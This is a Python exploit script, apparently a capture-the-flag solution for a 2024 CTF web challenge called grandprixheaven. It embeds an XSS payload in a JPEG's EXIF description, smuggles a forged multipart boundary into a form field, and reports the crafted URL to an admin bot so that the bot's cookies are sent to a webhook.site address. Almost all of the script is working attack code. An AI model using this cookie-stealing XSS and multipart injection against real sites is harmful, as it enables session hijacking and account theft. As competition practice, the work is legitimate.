from PIL import Image
import io, piexif
import requests
import urllib

# url = "http://localhost:9999"
url = "https://grandprixheaven-web.2024.ctfcompetition.com"

server = "https://webhook.site/12fc89a1-4e74-4ec3-b300-d4f2c5b32133/"

img = Image.new('RGB', (10, 10))
exif_dict = {'0th': {270: f"<img src=x onerror='window.location=\"{server}\"+document.cookie'>"}}
exif_bytes = piexif.dump(exif_dict) 

buffer = io.BytesIO() 

img.save(buffer, format='JPEG', exif=exif_bytes)

buffer.seek(0)

r = requests.post(
    f"{url}/api/new-car",
    allow_redirects=False, 
    files={
        'image': ('test.jpg', buffer, 'image/jpeg')
    }, 
    data={
        "year": 2004,
        "make": "Ferrari",
        "model": "F2004",
        "custom": '{"1":"retrieve","2\\"\\r\\n\\r\\nmediaparser\\r\\n--GP_HEAVEN\\r\\nContent-Disposition: form-data; name=\\"3":"head_end","4":"faves","5":"footer","6":"footer","0a":"csp"}'
    },
)

print(r.status_code)
print(r.text)
f1url = urllib.parse.urlparse(f"{url}" + r.headers['Location'])
f1path = f1url.path
f1qry = urllib.parse.parse_qs(f1url.query)

r = requests.get(
    f"{url}/api/get-car/{f1qry['F1'][0]}"
)

imgid = r.json()['img_id']
params = { 
    "F1": f"\media\{imgid}"
}

xssurl = f"{url}{f1path}?{urllib.parse.urlencode(params)}"
print(xssurl)

r = requests.post(
    f"{url}/report", 
    data={"url": xssurl}
)
assert r.status_code == 200
print("Report Success !")